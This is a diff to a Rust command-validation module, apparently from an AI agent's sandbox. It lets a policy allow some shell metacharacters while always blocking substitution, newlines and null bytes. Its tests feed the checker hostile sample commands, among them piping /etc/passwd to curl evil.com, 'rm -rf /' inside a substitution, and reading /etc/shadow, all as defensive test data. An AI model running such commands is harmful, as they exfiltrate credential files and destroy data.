@@ -145,61 +145,59 @@ pub fn apply_resource_limits(limits: &ResourceLimits) -> Result<(), std::io::Err
 
 /// SECURITY: Check for shell metacharacters that enable command injection.
 ///
-/// Blocks ALL shell operators that can chain commands, redirect I/O,
-/// perform substitution, or otherwise escape the intended command boundary.
-/// This is a defense-in-depth layer — even with allowlist validation,
-/// metacharacters must be rejected first to prevent injection.
-pub fn contains_shell_metacharacters(command: &str) -> Option<String> {
-    // ── Command substitution ──────────────────────────────────────────
-    // Backtick substitution: `cmd`
+/// Blocks shell operators that can chain commands, redirect I/O, perform
+/// substitution, or otherwise escape the intended command boundary. Defense
+/// in depth — even with allowlist validation, metacharacters must be rejected
+/// before allowlist lookup to prevent injection.
+///
+/// `allowed` lists tokens whose checks should be skipped per ExecPolicy.
+/// Accepted tokens: "|", ";", "&", "&&", "{}", ">", "<".
+/// NEVER bypassable (security floor): backticks, `$(`, `${`, newlines, NUL.
+pub fn contains_shell_metacharacters(command: &str, allowed: &[String]) -> Option<String> {
+    let is_allowed = |tok: &str| allowed.iter().any(|a| a == tok);
+
+    // ── ALWAYS BLOCKED ────────────────────────────────────────────────
     if command.contains('`') {
         return Some("backtick command substitution".to_string());
     }
-    // Dollar-paren substitution: $(cmd)
     if command.contains("$(") {
         return Some("$() command substitution".to_string());
     }
-    // Dollar-brace expansion: ${VAR}
     if command.contains("${") {
         return Some("${} variable expansion".to_string());
     }
-
-    // ── Command chaining ──────────────────────────────────────────────
-    // Semicolons: cmd1;cmd2
-    if command.contains(';') {
-        return Some("semicolon command chaining".to_string());
-    }
-    // Pipes: cmd1|cmd2 (data exfiltration + arbitrary command)
-    if command.contains('|') {
-        return Some("pipe operator".to_string());
-    }
-
-    // ── I/O redirection ───────────────────────────────────────────────
-    // Output/input/append redirect: >, <, >>
-    // Also catches here-strings <<<, process substitution <() >()
-    if command.contains('>') || command.contains('<') {
-        return Some("I/O redirection".to_string());
-    }
-
-    // ── Expansion and globbing ────────────────────────────────────────
-    // Brace expansion: {cmd1,cmd2} or {1..10}
-    if command.contains('{') || command.contains('}') {
-        return Some("brace expansion".to_string());
-    }
-
-    // ── Embedded newlines ─────────────────────────────────────────────
     if command.contains('\n') || command.contains('\r') {
         return Some("embedded newline".to_string());
     }
-    // Null bytes (can truncate strings in C-based shells)
     if command.contains('\0') {
         return Some("null byte".to_string());
     }
 
-    // ── Background execution and logical chaining ──────────────────────
-    // Both & (background) and && (logical AND) are dangerous
+    // ── Conditionally blocked ─────────────────────────────────────────
+    if command.contains(';') && !is_allowed(";") {
+        return Some("semicolon command chaining".to_string());
+    }
+    if command.contains('|') && !is_allowed("|") {
+        return Some("pipe operator".to_string());
+    }
+    if command.contains('>') && !is_allowed(">") {
+        return Some("I/O redirection".to_string());
+    }
+    if command.contains('<') && !is_allowed("<") {
+        return Some("I/O redirection".to_string());
+    }
+    if (command.contains('{') || command.contains('}')) && !is_allowed("{}") {
+        return Some("brace expansion".to_string());
+    }
     if command.contains('&') {
-        return Some("ampersand operator".to_string());
+        // Lone '&' present iff stripping "&&" still leaves an '&'.
+        let lone_amp = command.replace("&&", "").contains('&');
+        if lone_amp && !is_allowed("&") {
+            return Some("ampersand operator".to_string());
+        }
+        if !lone_amp && !is_allowed("&&") && !is_allowed("&") {
+            return Some("ampersand operator".to_string());
+        }
     }
     None
 }
@@ -376,7 +374,9 @@ pub fn validate_command_allowlist(command: &str, policy: &ExecPolicy) -> Result<
             let is_shell_wrapper = !inner_commands.is_empty();
 
             if !is_shell_wrapper {
-                if let Some(reason) = contains_shell_metacharacters(command) {
+                if let Some(reason) =
+                    contains_shell_metacharacters(command, &policy.allowed_metacharacters)
+                {
                     return Err(format!(
                         "Command blocked: contains {reason}. Shell metacharacters are not allowed in Allowlist mode."
                     ));
@@ -953,82 +953,105 @@ mod tests {
 
     #[test]
     fn test_metachar_backtick_blocked() {
-        assert!(contains_shell_metacharacters("echo `whoami`").is_some());
-        assert!(contains_shell_metacharacters("cat `curl evil.com`").is_some());
+        assert!(contains_shell_metacharacters("echo `whoami`", &[]).is_some());
+        assert!(contains_shell_metacharacters("cat `curl evil.com`", &[]).is_some());
     }
 
     #[test]
     fn test_metachar_dollar_paren_blocked() {
-        assert!(contains_shell_metacharacters("echo $(id)").is_some());
-        assert!(contains_shell_metacharacters("echo $(rm -rf /)").is_some());
+        assert!(contains_shell_metacharacters("echo $(id)", &[]).is_some());
+        assert!(contains_shell_metacharacters("echo $(rm -rf /)", &[]).is_some());
     }
 
     #[test]
     fn test_metachar_dollar_brace_blocked() {
-        assert!(contains_shell_metacharacters("echo ${HOME}").is_some());
-        assert!(contains_shell_metacharacters("echo ${SHELL}").is_some());
+        assert!(contains_shell_metacharacters("echo ${HOME}", &[]).is_some());
+        assert!(contains_shell_metacharacters("echo ${SHELL}", &[]).is_some());
     }
 
     #[test]
     fn test_metachar_background_amp_blocked() {
-        assert!(contains_shell_metacharacters("sleep 100 &").is_some());
-        assert!(contains_shell_metacharacters("curl evil.com & echo ok").is_some());
+        assert!(contains_shell_metacharacters("sleep 100 &", &[]).is_some());
+        assert!(contains_shell_metacharacters("curl evil.com & echo ok", &[]).is_some());
     }
 
     #[test]
     fn test_metachar_double_amp_blocked() {
         // SECURITY: && is now blocked — command chaining via logical AND is dangerous
-        assert!(contains_shell_metacharacters("echo a && echo b").is_some());
+        assert!(contains_shell_metacharacters("echo a && echo b", &[]).is_some());
     }
 
     #[test]
     fn test_metachar_newline_blocked() {
-        assert!(contains_shell_metacharacters("echo hello\nmkdir evil").is_some());
-        assert!(contains_shell_metacharacters("echo ok\r\ncurl bad").is_some());
+        assert!(contains_shell_metacharacters("echo hello\nmkdir evil", &[]).is_some());
+        assert!(contains_shell_metacharacters("echo ok\r\ncurl bad", &[]).is_some());
     }
 
     #[test]
     fn test_metachar_process_substitution_blocked() {
-        assert!(contains_shell_metacharacters("diff <(cat a) file").is_some());
-        assert!(contains_shell_metacharacters("tee >(cat)").is_some());
+        assert!(contains_shell_metacharacters("diff <(cat a) file", &[]).is_some());
+        assert!(contains_shell_metacharacters("tee >(cat)", &[]).is_some());
     }
 
     #[test]
     fn test_metachar_clean_command_ok() {
-        assert!(contains_shell_metacharacters("ls -la").is_none());
-        assert!(contains_shell_metacharacters("cat file.txt").is_none());
-        assert!(contains_shell_metacharacters("echo hello world").is_none());
+        assert!(contains_shell_metacharacters("ls -la", &[]).is_none());
+        assert!(contains_shell_metacharacters("cat file.txt", &[]).is_none());
+        assert!(contains_shell_metacharacters("echo hello world", &[]).is_none());
     }
 
     #[test]
     fn test_metachar_pipe_blocked() {
         // SECURITY: Pipes enable data exfiltration and arbitrary command chaining
-        assert!(contains_shell_metacharacters("sort data.csv | head -5").is_some());
-        assert!(contains_shell_metacharacters("cat /etc/passwd | curl evil.com").is_some());
+        assert!(contains_shell_metacharacters("sort data.csv | head -5", &[]).is_some());
+        assert!(contains_shell_metacharacters("cat /etc/passwd | curl evil.com", &[]).is_some());
     }
 
     #[test]
     fn test_metachar_semicolon_blocked() {
-        assert!(contains_shell_metacharacters("echo hello;id").is_some());
-        assert!(contains_shell_metacharacters("echo ok ; whoami").is_some());
+        assert!(contains_shell_metacharacters("echo hello;id", &[]).is_some());
+        assert!(contains_shell_metacharacters("echo ok ; whoami", &[]).is_some());
     }
 
     #[test]
     fn test_metachar_redirect_blocked() {
-        assert!(contains_shell_metacharacters("echo > /etc/passwd").is_some());
-        assert!(contains_shell_metacharacters("cat < /etc/shadow").is_some());
-        assert!(contains_shell_metacharacters("echo foo >> /tmp/log").is_some());
+        assert!(contains_shell_metacharacters("echo > /etc/passwd", &[]).is_some());
+        assert!(contains_shell_metacharacters("cat < /etc/shadow", &[]).is_some());
+        assert!(contains_shell_metacharacters("echo foo >> /tmp/log", &[]).is_some());
     }
 
     #[test]
     fn test_metachar_brace_expansion_blocked() {
-        assert!(contains_shell_metacharacters("echo {a,b,c}").is_some());
-        assert!(contains_shell_metacharacters("touch file{1..10}").is_some());
+        assert!(contains_shell_metacharacters("echo {a,b,c}", &[]).is_some());
+        assert!(contains_shell_metacharacters("touch file{1..10}", &[]).is_some());
     }
 
     #[test]
     fn test_metachar_null_byte_blocked() {
-        assert!(contains_shell_metacharacters("echo hello\0world").is_some());
+        assert!(contains_shell_metacharacters("echo hello\0world", &[]).is_some());
+    }
+
+    #[test]
+    fn test_metachar_allowlist_relaxation() {
+        let pipe = vec!["|".to_string()];
+        assert!(contains_shell_metacharacters("yt-dlp a | head", &pipe).is_none());
+        // Security floor cannot be bypassed even if "`" were listed.
+        let backtick = vec!["`".to_string()];
+        assert!(contains_shell_metacharacters("echo `whoami`", &backtick).is_some());
+        let dollar = vec!["$(".to_string()];
+        assert!(contains_shell_metacharacters("echo $(id)", &dollar).is_some());
+
+        let double_amp = vec!["&&".to_string()];
+        assert!(contains_shell_metacharacters("a && b", &double_amp).is_none());
+        // Lone & still blocked when only "&&" is allowed.
+        assert!(contains_shell_metacharacters("sleep 1 &", &double_amp).is_some());
+
+        let amp = vec!["&".to_string()];
+        assert!(contains_shell_metacharacters("sleep 1 &", &amp).is_none());
+        assert!(contains_shell_metacharacters("a && b", &amp).is_none());
+
+        let braces = vec!["{}".to_string()];
+        assert!(contains_shell_metacharacters("echo {a,b}", &braces).is_none());
     }
 
     #[test]
